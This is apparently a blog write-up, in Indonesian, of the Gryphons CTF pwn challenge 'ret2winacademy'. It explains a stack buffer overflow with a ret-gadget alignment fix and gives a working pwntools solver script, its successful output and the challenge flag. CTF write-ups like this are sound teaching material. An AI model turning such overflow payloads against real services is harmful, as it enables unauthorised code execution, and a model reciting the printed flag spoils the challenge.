---
title: "Gryphons CTF - ret2winacademy (pwn)"
date: "2025-11-03"
tags: ["pwn", "ctf", "writeup", "gryphons"]
summary: "Write-up for 'ret2winacademy' — stack buffer overflow with 16-byte alignment fix via ret gadget to reach win()."
image: "/blog/the_diary/public.png"
author: "Erwin Wijaya"
draft: false
featured: false
---

## Pendahuluan

Challenge **ret2winacademy** memperkenalkan teknik dasar *stack buffer overflow* pada arsitektur **x86-64**. Targetnya sederhana: **mengalihkan return address** ke fungsi `win()` agar mencetak flag. Tantangan tambahannya adalah **stack alignment** (aturan 16-byte sebelum *call*)—tanpa align yang benar, proses bisa *crash* saat `win()` memanggil libc (`fopen`, `puts`, `printf`).

Service: `nc chal1.gryphons.sg 9005`  
Binary menampilkan **stack visualization** (alamat buffer, saved RBP, return address) dan alamat `win()` (mis: `0x4011b6`).

---

## Analisis Singkat

- Buffer pada `vuln()` berukuran **40 byte** namun dibaca dengan `fgets(..., 100, ...)` → overflow.
- Jarak dari **start buffer → return address** adalah **56 byte**:  
  `40 (buffer) + 8 (saved RBP) + 8 (alignment slot)`.
- Agar stabil, **jaga saved RBP** dan **perbaiki alignment** sebelum masuk `win()` dengan satu **RET gadget**.

Dari beberapa run, gadget **`ret` di 0x401016** bekerja untuk menyelaraskan stack.

---

## Layout Stack (dari output program)

```
...                           <-- VULN's Return Address (Your Target!)
...                           <-- VULN's RBP
... A A A A A A A A ...
... A A A A A A A A ...       <-- Start of Buffer (40 bytes)
```

**Payload final** (dalam urutan tulis dari awal buffer):
```
[ A * 40 ]  [ align 8 ]  [ saved_rbp 8 ]  [ ret_gadget 8 ]  [ win() 8 ]
```

> Catatan: Di dump, bytes kolom hexdump dicetak **high→low**; kalau butuh merekonstruksi nilai 64-bit (little-endian), **balik urutannya**.

---

## Solver (Python + pwntools)

Solver ini:
1) ambil **saved RBP** dari banner (strip ANSI),
2) coba beberapa layout (termasuk menambahkan **ret gadget `0x401016`**),
3) berhenti saat mendeteksi output sukses (`graduated` / `Here is your flag:`).

```python
#!/usr/bin/env python3
# solve.py - ret2winacademy robust solver (auto alignment/ret gadget)
from pwn import *
import re

HOST, PORT = "chal1.gryphons.sg", 9005
WIN = 0x4011b6

ANSI_RE = re.compile(rb"\x1b\[[0-9;]*[A-Za-z]")

def strip_ansi(b: bytes) -> str:
    return ANSI_RE.sub(b"", b).decode(errors="ignore")

def parse_saved_rbp(banner_clean: str) -> bytes:
    m = re.search(
        r"^\s*0x[0-9a-fA-F]+\s*\|\s*([0-9A-Fa-f]{2}(?:\s[0-9A-Fa-f]{2}){7})\s*\|.*VULN's RBP",
        banner_clean, flags=re.M
    )
    if not m:
        raise ValueError("cannot find VULN's RBP line")
    toks = m.group(1).split()
    # hexdump printed high->low; reverse to memory LE
    return bytes.fromhex("".join(reversed(toks)))

def looks_success(s: str) -> bool:
    return ("graduated from ret2win" in s) or ("Here is your flag:" in s)

def try_payload(payload: bytes) -> str:
    io = remote(HOST, PORT, timeout=5)
    banner = io.recvuntil(b"payload > ", timeout=5)
    io.sendline(payload)
    out = io.recvall(timeout=5)
    io.close()
    return strip_ansi(banner) + out.decode(errors="ignore")

def main():
    # kandidat RET gadget (ret-sled untuk alignment)
    ret_candidates = [0x401016, 0x401603, 0x40101a, 0x4011b0]

    # Ambil saved RBP terlebih dahulu
    io = remote(HOST, PORT, timeout=5)
    banner = io.recvuntil(b"payload > ", timeout=5)
    banner_clean = strip_ansi(banner)
    io.close()

    saved_rbp = parse_saved_rbp(banner_clean)

    # Layouts:
    layouts = []
    # (S0) tanpa align slot (kadang crash): A*40 + saved_rbp + win
    layouts.append(("S0(no-align)", b"A"*40 + saved_rbp + p64(WIN)))
    # (S1) tambahkan 8-byte align slot antara buffer & saved_rbp
    layouts.append(("S1(align-slot)", b"A"*40 + b"\x00"*8 + saved_rbp + p64(WIN)))
    # (S2) ret-sled: align-slot + saved_rbp + RET + win
    for g in ret_candidates:
        layouts.append((f"S2(ret=0x{g:06x})", b"A"*40 + b"\x00"*8 + saved_rbp + p64(g) + p64(WIN)))

    for name, payload in layouts:
        out = try_payload(payload)
        if looks_success(out):
            print(f"[+] SUCCESS with layout: {name}")
            print(f"[+] Payload length: {len(payload)}")
            print(out)
            # Optional: extract flag
            m = re.search(r"Here is your flag:\s*(.+)", out)
            if m:
                print("[FLAG]", m.group(1).strip())
            return
        else:
            ret_line = re.search(r"Now returning to\s*-->\s*([^\s]+)", out)
            print(f"[-] {name} failed; return-> {ret_line.group(1) if ret_line else 'n/a'}")

    print("[!] All layouts failed. Paste banner+after-stack here untuk analisis lanjut.")

if __name__ == "__main__":
    main()
```

### Contoh Output Sukses

```
[+] SUCCESS with layout: S2(ret=0x401016)
Now returning to --> 0x401016

you graduated from ret2win school :D
Here is your flag: GCTF25{mY_F1rSt_reT2Win!_19snd801j8n1asd}
```

---

